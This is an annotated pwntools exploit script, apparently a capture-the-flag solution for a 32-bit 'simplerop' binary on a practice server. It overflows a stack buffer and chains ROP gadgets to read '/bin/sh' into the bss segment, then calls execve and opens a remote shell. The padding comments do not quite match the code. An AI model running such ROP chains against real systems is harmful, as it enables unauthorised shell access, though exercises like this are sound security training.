#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

# 设置运行环境：32位Linux系统，调试模式
context(os="linux", arch="i386", log_level="debug")

# 连接远程目标（示例为CTF比赛服务器）
sh = remote("node4.buuoj.cn", 27987)

# ==================== 关键地址配置 ====================
# 系统调用相关地址
read_addr = 0x0806cd50       # read函数地址
int_80 = 0x080493e1          # int 0x80指令地址

# ROP gadgets（通过ROPgadget工具查找）
pop_eax_ret = 0x080bae06     # pop eax; ret
pop_edx_ecx_ebx_ret = 0x0806e850  # pop edx; pop ecx; pop ebx; ret
bss_addr = 0x080EB13D        # 可写的bss段地址

# 备用gadgets（注释中保留备选方案）
pop_ebx_ret = 0x080481c9     # pop ebx; ret
pop_ecx_ebx_ret = 0x0806e851  # pop ecx; pop ebx; ret
pop_edx_ret = 0x0806e82a      # pop edx; ret

# ==================== 攻击原理说明 ====================
# 32位系统调用约定：
# eax=系统调用号（execve=11）
# ebx=第一个参数（/bin/sh地址）
# ecx=第二个参数（0）
# edx=第三个参数（0）

# 攻击分为两个阶段：
# 1. 使用read函数将"/bin/sh"写入bss段
# 2. 执行execve("/bin/sh", 0, 0)
# ROPgadget --binary simplerop --only "eax|pop|ret"  |grep "eax"
# ROPgadget --binary simplerop --only "ebx|pop|ret"  |grep "ebx"
# ROPgadget --binary simplerop --only "ecx|pop|ret"  |grep "ecx"
# ROPgadget --binary simplerop --only "edx|pop|ret"  |grep "edx"
# ==================== payload构造 ====================
offset = 0x14 + 4  # 填充到返回地址（0x14字节覆盖+4字节旧ebp）

# 方案1：使用组合gadget实现read+execve
payload = b'a' * offset + b'a' * 4  # 填充到返回地址（0x14字节覆盖+4字节旧ebp）
# 调用read(0, bss_addr, 8)读取"/bin/sh"
payload += p32(pop_edx_ecx_ebx_ret) + p32(8) + p32(bss_addr) + p32(0)
payload += p32(read_addr)
# 设置execve参数
payload += p32(pop_eax_ret) + p32(11)      # eax = 11 (execve)
payload += p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bss_addr)
payload += p32(int_80)                     # 触发系统调用

# 方案2：分步设置寄存器（备用方案）
# payload = b'a' * offset
# payload += p32(pop_eax_ret) + p32(3)       # eax = 3 (read)
# payload += p32(pop_edx_ret) + p32(8)       # edx = 8 (长度)
# payload += p32(pop_ecx_ebx_ret) + p32(bss_addr) + p32(0) # ecx = bss_addr, ebx = 0
# payload += p32(read_addr)
# ...（后续类似）

# ==================== 执行攻击 ====================
sh.sendline(payload)      # 发送第一阶段payload
sh.interactive()  # 切换到交互模式

# ====================== 补充说明 ====================
# 32位与64位区别：
# 1. 系统调用号不同（32位execve=11，64位=59）
# 2. 触发指令不同（32位用int 0x80，64位用syscall）
# 3. 传参方式不同（32位用栈传参，64位用寄存器）